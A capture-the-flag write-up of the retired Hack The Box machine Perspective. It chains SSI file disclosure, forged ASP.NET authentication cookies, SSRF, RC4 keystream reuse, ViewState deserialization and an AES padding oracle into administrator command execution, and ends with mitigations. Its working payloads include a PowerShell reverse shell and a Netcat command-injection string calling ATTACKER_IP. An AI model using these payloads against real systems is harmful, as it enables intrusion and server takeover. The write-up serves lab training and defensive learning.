---
title: "Hack The Box — Perspective: ASP.NET Crypto Exploitation"
summary: "Perspective chains SSI file disclosure, forged ASP.NET authentication, RC4 keystream reuse, ViewState deserialization and an AES padding oracle."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Insane"
os: "Windows"
solvedAt: 2026-09-07
publishedAt: 2026-09-07
tags:
  - aspnet
  - iis
  - server-side-includes
  - authentication-forgery
  - ssrf
  - rc4
  - viewstate-deserialization
  - padding-oracle
  - command-injection
tools:
  - Nmap
  - Burp Suite
  - curl
  - C#
  - Python
  - ysoserial.net
  - tcpdump
  - SSH
  - PadBuster
  - Netcat
cves: []
htbUrl: "https://www.hackthebox.com/machines/perspective"
cover: "/images/writeups/hackthebox/machines/perspective/perspective.png"
coverAlt: "Hack The Box Perspective artwork showing a figure facing a mountain through a mechanical portal"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box machine Perspective. All commands were executed only against the isolated lab. Flag values, authentication cookies, reset tokens, private keys, personal identifiers and session-specific addresses have been removed.

## Introduction

Perspective is an Insane Windows machine built around a long chain of ASP.NET and cryptographic failures. The interesting part was not one isolated vulnerability, but how each trust boundary exposed the material needed to cross the next one: an upload filter exposed `web.config`; the leaked `machineKey` enabled Forms Authentication forgery; an admin-only PDF feature reached a loopback encryption service; RC4 keystream reuse disclosed the `ViewStateUserKey`; and a signed malicious ViewState gave command execution. A separate staging application then turned an AES-CBC padding oracle into command injection running with administrative privileges.

This article follows my actual solve. Long cookies, ViewState blobs and ciphertexts are omitted, while meaningful failures are retained because several of them changed the path I took. The official HTB material was used late in the solve to verify the staging handler and final injection shape; the exploitation itself was completed with PadBuster rather than the reference tool.

## Machine information

| Item | Value |
| --- | --- |
| Platform | Hack The Box |
| Machine | Perspective |
| Difficulty | Insane |
| Operating system | Windows |
| Exposed services | OpenSSH for Windows, Microsoft IIS 10.0 |
| Publication status | Retired, verified on 7 September 2026 |

The target and VPN addresses were session-specific, so I use `TARGET_IP` and `ATTACKER_IP` below.

## Executive summary

I bypassed the image-upload validation by pairing an `.shtml` extension with an allowed multipart content type. IIS processed an SSI include inside the uploaded file and returned the application's `web.config`, including fixed ASP.NET cryptographic keys and an encrypted per-user ViewState secret. I used the keys to forge an administrator `.ASPXAUTH` cookie. The resulting admin-only PDF generator rendered attacker-controlled HTML and provided SSRF to an internal encryption API. Because the service reused an RC4 keystream, a known plaintext/ciphertext pair decrypted the `ViewStateUserKey`. A signed `ysoserial.net` ViewState then executed commands as `perspective\webuser`.

Local enumeration revealed an SSH key and an internal staging site on port 8009. Its password-reset handler disclosed padding errors for attacker-modified AES-CBC tokens. PadBuster encrypted chosen plaintext without knowing the key. The decrypted token was concatenated directly into a privileged `cmd.exe /c` command, so a forged token containing a command separator launched Netcat and returned a shell as `perspective\administrator`.

## Attack path

| Stage | Confirmed result |
| --- | --- |
| IIS upload filter bypass | Uploaded executable `.shtml` content as `image/jpeg` |
| SSI file disclosure | Read `../web.config` from `/Images/` |
| Forms Authentication forgery | Replaced the ticket identity with `admin@perspective.htb` |
| PDF-renderer SSRF | Reached Swagger and `/encrypt` on `127.0.0.1:8000` |
| RC4 keystream reuse | Recovered `SAltysAltYV1ewSTaT3` as the `ViewStateUserKey` |
| ViewState deserialization | Executed a ping and then obtained a `webuser` shell |
| Internal enumeration | Forwarded the staging application on `127.0.0.1:8009` |
| AES padding oracle | Forged arbitrary password-reset plaintext with PadBuster |
| Command injection | Started Netcat from the decrypted token value |
| Privilege escalation | Received a shell as `perspective\administrator` |

## Environment setup and initial enumeration

I began with a full TCP scan and default service scripts:

```bash
export TARGET_IP='<assigned HTB address>'
nmap "$TARGET_IP" -T5 -sVC -p-
```

The useful result was small:

```text
22/tcp open  ssh   OpenSSH for_Windows_7.7
80/tcp open  http  Microsoft IIS httpd 10.0
```

Port 80 expected the host name `perspective.htb`, so I added a local mapping:

```bash
echo "$TARGET_IP perspective.htb" | sudo tee -a /etc/hosts
```

The site was the New Product Request System (NPRS). Registration and login were open, and an authenticated user could submit a product with an image.

## Upload validation bypass and SSI file disclosure

Submitting a normal image redirected to `/Products/ProductList`. Inspecting the response showed that the application retained the original base name and extension while adding random digits:

```html
<img src="../Images/proof_21269804495.shtml" style="height:60px;" />
```

The form claimed that only JPEG files were accepted. Changing only the uploaded part's `Content-Type` from `image/png` to `image/jpeg` produced a different response, which indicated that MIME validation and extension validation were separate. After testing extensions, `.shtml` was accepted.

I uploaded the following as `proof.shtml`, while keeping the multipart content type as `image/jpeg`:

```html
<!--#include file="../web.config"-->
```

Requesting the generated `/Images/proof_<digits>.shtml` path returned the configuration file. The important values were:

```xml
<machineKey
  compatibilityMode="Framework20SP2"
  validation="SHA1"
  decryption="AES"
  validationKey="99F1108B685094A8A31CDAA9CBA402028D80C08B40EBBC2C8E4BD4B0D31A347B0D650984650B24828DD120E236B099BFDD491910BF11F6FA915BF94AD93B52BF"
  decryptionKey="B16DA07AB71AB84143A037BCDD6CFB42B9C34099785C10F9" />

<add key="ViewStateUserKey" value="ENC1:3UVxtz9jwPJWRvjdl1PfqXZTgg==" />
<add key="SecurePasswordServiceUrl" value="http://localhost:8000" />
```

The fixed `machineKey` was enough to decrypt and re-encrypt Forms Authentication tickets. It was not yet enough for a malicious ViewState because the application also incorporated the encrypted `ViewStateUserKey`.

## Forging the administrator authentication cookie

I created a small C# utility around `System.Web.Security.FormsAuthentication`. It decrypted my current ticket, preserved its version and user data, and replaced only the identity:

```csharp
FormsAuthenticationTicket original =
    FormsAuthentication.Decrypt(args[0]);

FormsAuthenticationTicket forged = new FormsAuthenticationTicket(
    original.Version,
    "admin@perspective.htb",
    DateTime.Now,
    DateTime.Now.AddHours(8),
    true,
    original.UserData,
    "/");

Console.WriteLine(FormsAuthentication.Encrypt(forged));
```

The helper's `.config` contained the leaked AES and SHA1 MachineKey settings. My first attempt failed because I tried to execute the .NET binary directly from Kali:

```text
.ForgePerspectiveCookie.exe: command not found
```

Running it inside a Windows VM worked:

```powershell
.\ForgePerspectiveCookie.exe '<current ASPXAUTH value>'
```

I replaced the browser's `.ASPXAUTH` value with the generated result. The site displayed `admin@perspective.htb`, and `/Admin/Adminhome` confirmed the `Administrator` role. Neither the original nor forged cookies are included here.

## Admin PDF generation as SSRF

The admin product panel could load another user's products and generate a PDF snapshot. Since product descriptions were user-controlled HTML, I created a product containing:

```html
<meta http-equiv="refresh" content="0;url=http://127.0.0.1:8000/">
```

After loading that user's products as admin and selecting **Generate PDF**, the document contained Swagger UI for an internal `AdminAPI`. Repeating the request for its OpenAPI document exposed two routes:

```html
<meta http-equiv="refresh"
      content="0;url=http://127.0.0.1:8000/swagger/v1/swagger.json">
```

```text
GET  /encrypt?plaintext=<value>
POST /decrypt?cipherTextRaw=<value>
```

The PDF renderer could trigger the GET route, but not the POST-only decryption route. The leaked configuration suggested that this service protected `ViewStateUserKey`, so I focused on the encryption behavior instead.

## Recovering `ViewStateUserKey` from RC4 keystream reuse

I requested the encryption of 32 known `A` characters through the same SSRF path:

```html
<meta http-equiv="refresh"
      content="0;url=http://127.0.0.1:8000/encrypt?plaintext=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
```

The rendered response was:

```text
enc1:z0VcggdRwN9jXu+ts2XNvFZG8CTFWmiTM6qgDevL+AY=
```

The encrypted application value decoded to 19 bytes rather than an AES-sized ciphertext. Because the service reused a stream-cipher keystream, the known plaintext recovered the first 32 keystream bytes. XORing the first 19 with the configured ciphertext recovered the hidden value:

```python
import base64

known_plain = b"A" * 32
known_cipher = base64.b64decode(
    "z0VcggdRwN9jXu+ts2XNvFZG8CTFWmiTM6qgDevL+AY="
)
target_cipher = base64.b64decode(
    "3UVxtz9jwPJWRvjdl1PfqXZTgg=="
)

keystream = bytes(c ^ p for c, p in zip(known_cipher, known_plain))
recovered = bytes(c ^ k for c, k in zip(target_cipher, keystream))
print(recovered.decode())
```

```text
SAltysAltYV1ewSTaT3
```

This local XOR step is reconstructed from the known plaintext/ciphertext artifacts retained from my session; the exact one-line command I originally used was not preserved.

## Forging a malicious ASP.NET ViewState

I captured a fresh POST to `/Admin/AdminProducts` and recorded its path-specific generator:

```text
__VIEWSTATEGENERATOR=DD9C14DD
```

At this point I had every input required by the `ysoserial.net` ViewState plugin:

```text
Validation algorithm : SHA1
Validation key       : leaked from web.config
Decryption algorithm : AES
Decryption key       : leaked from web.config
ViewState generator  : DD9C14DD
ViewState user key   : SAltysAltYV1ewSTaT3
```

### A tooling failure that mattered

I downloaded `ysoserial.net` and initially ran it under Mono on Kali. Both the normal and `--minify` variants failed inside `TypeConfuseDelegate`:

```text
System.NullReferenceException: Object reference not set to an instance of an object
at ysoserial.Generators.TypeConfuseDelegateGenerator...
```

Windows Defender also blocked the archive when I first extracted it on Windows. Because this was an isolated disposable analysis VM, I kept the tooling in a dedicated lab directory and ran the Windows build there. I would not disable endpoint protection globally or use this workflow on a normal workstation.

The working payload-generation shape was:

```powershell
.\ysoserial.exe `
  -p ViewState `
  -g TypeConfuseDelegate `
  -c "ping -n 3 ATTACKER_IP" `
  --generator=DD9C14DD `
  --decryptionalg=AES `
  --decryptionkey=B16DA07AB71AB84143A037BCDD6CFB42B9C34099785C10F9 `
  --validationalg=SHA1 `
  --validationkey=99F1108B685094A8A31CDAA9CBA402028D80C08B40EBBC2C8E4BD4B0D31A347B0D650984650B24828DD120E236B099BFDD491910BF11F6FA915BF94AD93B52BF `
  --viewstateuserkey=SAltysAltYV1ewSTaT3
```

On Kali I watched for the callback:

```bash
sudo tcpdump -ni tun0 icmp
```

I replaced `__VIEWSTATE` in the captured admin POST with the generated value while preserving the current administrator cookie, session ID, generator and ordinary form fields. Three ICMP requests arrived from the target, confirming deserialization-based RCE.

### From command execution to a `webuser` shell

I encoded a PowerShell TCP client as UTF-16LE Base64 and used the resulting command as the gadget argument:

```powershell
$ReverseShell = @'
$client=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);
$stream=$client.GetStream();
[byte[]]$bytes=0..65535|ForEach-Object{0};
while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){
  $data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $result=(Invoke-Expression $data 2>&1 | Out-String);
  $prompt=$result+'PS '+(Get-Location).Path+'> ';
  $output=([System.Text.Encoding]::ASCII).GetBytes($prompt);
  $stream.Write($output,0,$output.Length);
  $stream.Flush()
};
$client.Close();
'@

$EncodedCommand = [Convert]::ToBase64String(
    [Text.Encoding]::Unicode.GetBytes($ReverseShell)
)
$Command = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand $EncodedCommand"
```

After generating and submitting a ViewState for `$Command`, my listener received:

```text
perspective\webuser
```

The user flag was present on the desktop; its value is intentionally omitted.

## Internal enumeration and the staging application

The `webuser` profile contained an SSH private key. I recovered it, restricted its local permissions and used it for a stable session. Network enumeration revealed an additional application on port 8009, which I forwarded through SSH:

```bash
chmod 600 webuser_id_rsa
ssh -i webuser_id_rsa \
  -L 8009:127.0.0.1:8009 \
  webuser@perspective.htb
```

Browsing to `http://127.0.0.1:8009/` displayed another NPRS instance. Its footer identified it as the staging environment. I registered a lab-only account, requested a password reset and captured the token from the generated `/Account/forgot?token=...` URL.

Submitting the valid token to `/handlers/changePassword.ashx` worked normally. Changing its final character produced a highly specific exception:

```text
Padding is invalid and cannot be removed.
```

That response was a classic padding oracle: the application revealed whether attacker-controlled AES-CBC ciphertext decrypted to valid padding.

## Encrypting chosen plaintext with PadBuster

The supplied official material used pyOracle2. I had already begun testing with PadBuster, so I kept that path. The confirmed parameters were a 16-byte block size, Base64URL encoding and a negative oracle string of `Padding is invalid`.

I first forged a token whose decrypted value was the administrator email:

```bash
export TOKEN='<fresh valid staging reset token>'

padbuster \
  'http://127.0.0.1:8009/handlers/changePassword.ashx' \
  "$TOKEN" \
  16 \
  -post "password1=Perspective26%21&password2=Perspective26%21&token=$TOKEN" \
  -encoding 4 \
  -error 'Padding is invalid' \
  -plaintext 'admin@perspective.htb' \
  | tee padbuster-admin.txt
```

PadBuster printed a local Perl warning about operator precedence, but continued through both blocks and produced a valid ciphertext. My first password, `Perspective2026`, failed even though it matched the handler's length and character allow-list:

```text
Non alpha numeric characters in 'newPassword' needs to be greater than or equal to '1'.
```

Adding an allowed special character resolved the membership-provider policy:

```bash
curl -si 'http://127.0.0.1:8009/handlers/changePassword.ashx' \
  --data-urlencode 'password1=Perspective26!' \
  --data-urlencode 'password2=Perspective26!' \
  --data-urlencode 'token=<forged admin token>'
```

```text
Resetting Password for user: admin@perspective.htb
...successfully changed password
```

This proved that PadBuster was producing ciphertext accepted by the staging application.

## Turning the oracle into privileged command injection

The password-reset handler eventually started an external process using logic equivalent to:

```csharp
new ProcessStartInfo(
    "cmd",
    "/c C:\\inetpub\\bin\\" + environment +
    "\\PasswordReset.exe " + decryptedstring + " " + password1
);
```

`password1` was constrained, but `decryptedstring` was checked only for printable characters. A forged token could therefore decrypt to an email address followed by `&` and another command.

I transferred Kali's Windows Netcat binary over the stable SSH channel:

```bash
scp -i webuser_id_rsa \
  /usr/share/windows-resources/binaries/nc.exe \
  webuser@perspective.htb:'C:/Users/webuser/Downloads/nc64.exe'
```

The final chosen plaintext was:

```text
admin@perspective.htb & C:\Users\webuser\Downloads\nc64.exe ATTACKER_IP 443 -e cmd.exe
```

I encrypted it with the same oracle:

```bash
padbuster \
  'http://127.0.0.1:8009/handlers/changePassword.ashx' \
  "$TOKEN" \
  16 \
  -post "password1=Perspective26%21&password2=Perspective26%21&token=$TOKEN" \
  -encoding 4 \
  -error 'Padding is invalid' \
  -plaintext 'admin@perspective.htb & C:\Users\webuser\Downloads\nc64.exe ATTACKER_IP 443 -e cmd.exe' \
  | tee padbuster-shell.txt
```

This time PadBuster solved six blocks. Before triggering it, I opened the listener:

```bash
sudo rlwrap -cAr nc -lvnp 443
```

### The final debugging mistake

I exported the long ciphertext as `$SHELL_TOKEN` in one terminal and sent the `curl` request from another. Environment variables are scoped to the shell process, so the second terminal submitted an empty token. The staging site returned:

```text
Specified initialization vector (IV) does not match the block size for this algorithm.
```

Exporting the ciphertext in the same terminal fixed it. I also checked its expected length before sending:

```bash
export SHELL_TOKEN='<PadBuster encrypted value>'
printf 'Token length: %s\n' "${#SHELL_TOKEN}"

curl -si 'http://127.0.0.1:8009/handlers/changePassword.ashx' \
  --data-urlencode 'password1=Perspective26!' \
  --data-urlencode 'password2=Perspective26!' \
  --data-urlencode "token=$SHELL_TOKEN"
```

The HTTP request remained open because the handler waited for the launched Netcat process. The listener received the connection:

```text
Microsoft Windows [Version 10.0.17763.2803]

c:\windows\system32\inetsrv> whoami
perspective\administrator
```

The final flag was present under the Administrator desktop. Its value is omitted.

## What did not work

| Attempt | Result and correction |
| --- | --- |
| Executing the cookie helper directly on Kali | It was a .NET Framework binary; running it on Windows succeeded |
| `ysoserial.net` under Mono | `TypeConfuseDelegate` threw `NullReferenceException`; the Windows build worked |
| Extracting the tool with Defender active | The archive was blocked; testing was confined to a disposable Windows lab VM |
| Replaying stale ASP.NET state | Redirects returned to login; I captured fresh cookies, session data and form state |
| Alphanumeric-only admin password | The membership provider required at least one special character |
| `Test-Path` in the remote shell | The shell was `cmd.exe`, not PowerShell; `dir` or `if exist` was appropriate |
| `$SHELL_TOKEN` exported in another terminal | The trigger sent an empty token and caused an IV error; exporting locally fixed it |

## Key takeaways

- A file-upload control is not safe when MIME and extension checks can disagree. The server must validate content, normalize names and prevent uploaded files from reaching an executable IIS handler.
- A static ASP.NET `machineKey` is application-wide signing material. Once disclosed, it can invalidate assumptions around Forms Authentication and ViewState integrity.
- `ViewStateUserKey` added a useful per-user boundary, but encrypting it with a reused RC4 keystream made that boundary recoverable from one chosen plaintext.
- SSRF impact depends on what trusts loopback. Here it converted an admin-only document feature into access to cryptographic functionality that was never exposed externally.
- Padding errors are not harmless diagnostics. An oracle can provide both decryption and chosen-plaintext encryption without revealing the AES key.
- Command construction with string concatenation remained dangerous even when the application applied a character check. Printable ASCII still includes shell metacharacters.
- Delivery mistakes matter. Runtime compatibility, endpoint protection, stale ASP.NET state and terminal-scoped variables each caused failures unrelated to the underlying exploit.

## Mitigations

| Weakness | Defensive action |
| --- | --- |
| Upload filter bypass | Verify file signatures, use allow-listed extensions, generate server-side names and store uploads outside executable web roots |
| SSI file disclosure | Disable SSI where unnecessary and prevent user uploads from being mapped to SSI handlers |
| Exposed `web.config` | Deny direct/indirect access, use protected configuration and rotate all disclosed keys |
| Forged Forms Authentication | Rotate MachineKey material, invalidate active tickets and migrate away from legacy Forms Authentication where possible |
| PDF-renderer SSRF | Sanitize active HTML, block redirects and enforce an outbound destination allow-list at the renderer and network layers |
| RC4 keystream reuse | Remove RC4; use a modern authenticated-encryption construction with a unique nonce per message |
| ViewState deserialization | Protect keys, keep MAC validation enabled, use current framework defenses and avoid unsafe deserialization gadget surfaces |
| Padding oracle | Return uniform errors, authenticate ciphertext before decryption and migrate to authenticated encryption |
| Command injection | Call the executable directly with a fixed argument array; never concatenate decrypted client data into `cmd.exe /c` |
| Excessive staging privileges | Run staging and helper processes under dedicated least-privilege service accounts |

## Tools used

- Nmap for service discovery.
- Burp Suite for multipart manipulation, cookie replacement and ASP.NET form replay.
- C# and `System.Web.Security` for Forms Authentication ticket forgery.
- Python for the RC4/XOR keystream recovery.
- `ysoserial.net` for signed ViewState generation.
- `tcpdump` for the ICMP execution test.
- SSH and SCP for stable access, port forwarding and file transfer.
- PadBuster for AES-CBC chosen-plaintext encryption through the padding oracle.
- Netcat for the final callbacks.

## References

- [Hack The Box — Perspective](https://www.hackthebox.com/machines/perspective)
- [Microsoft Learn — MachineKeyValidation](https://learn.microsoft.com/en-us/dotnet/api/system.web.configuration.machinekeyvalidation?view=netframework-4.8.1)
- [Microsoft Learn — Page.ViewStateUserKey](https://learn.microsoft.com/en-us/dotnet/api/system.web.ui.page.viewstateuserkey?view=netframework-4.8.1)
- [ysoserial.net ViewState plugin](https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs)
- [OWASP Web Security Testing Guide — Testing for Padding Oracle](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle)

[Browse the complete write-ups archive](/writeups/).
